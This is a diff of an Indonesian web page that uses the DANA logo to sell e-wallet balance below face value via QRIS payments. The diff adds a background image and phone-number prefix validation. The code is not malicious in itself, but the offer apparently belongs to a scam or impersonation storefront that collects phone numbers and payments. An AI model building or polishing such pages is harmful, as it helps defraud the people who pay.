@@ -7,7 +7,9 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            background-image: url('https://raw.githubusercontent.com/Peng4duanBrimo/Peng4duanBrimo.github.io/main/IMG-20240831-WA0022.jpg'); /* URL gambar latar belakang */
+            background-size: cover; /* Menyesuaikan gambar dengan ukuran layar */
+            background-position: center; /* Posisikan gambar di tengah */
             margin: 0;
             padding: 20px;
             display: flex;
@@ -47,7 +49,7 @@
             outline: none;
         }
 
-        .header input[type="text"]:focus {
+        .header input[type="tel"]:focus {
             border-bottom: 2px solid #273746; /* Biru Kehitaman */
         }
 
@@ -147,7 +149,7 @@
 <div class="container">
     <div class="header">
         <img src="https://raw.githubusercontent.com/Peng4duanBrimo/Peng4duanBrimo.github.io/main/CC_20240407_152118.png" alt="DANA Logo">
-        <input type="tel" id="phoneNumber" placeholder="Masukan Nomor HP">
+        <input type="tel" id="phoneNumber" placeholder="Masukan Nomor HP" oninput="validatePhoneNumber()">
     </div>
     <div class="options">
         <div class="option" data-qris="qris1" onclick="selectOption(this)">DANA 100.000<span>Rp 75.000</span></div>
@@ -158,7 +160,7 @@
         <div class="option" data-qris="qris6" onclick="selectOption(this)">DANA 1,000.000<span>Rp 750.000</span></div>
     </div>
     <div class="submit-button">
-        <button onclick="submitForm()">Lanjut</button>
+        <button id="submitButton" onclick="submitForm()" disabled>Lanjut</button>
     </div>
     <div class="loader" id="loader"></div>
     
@@ -201,6 +203,22 @@
 
 <script>
     let selectedOption = null;
+
+    function validatePhoneNumber() {
+        const phoneNumber = document.getElementById('phoneNumber').value;
+        const validPrefixes = [
+            '0878', '0877', '0859', '0818', '0817', '0895', '0896',
+            '0882', '0881', '0852', '0853', '0822', '0821', '0811',
+            '0813', '0838', '0831', '0856', '0857', '0858', '0819'
+        ];
+        const submitButton = document.getElementById('submitButton');
+
+        // Check if the phone number starts with a valid prefix and is between 12-13 digits long
+        const isValid = validPrefixes.some(prefix => phoneNumber.startsWith(prefix)) &&
+                        phoneNumber.length >= 12 && phoneNumber.length <= 13;
+
+        submitButton.disabled = !isValid;
+    }
 
     function selectOption(element) {
         if (selectedOption) {
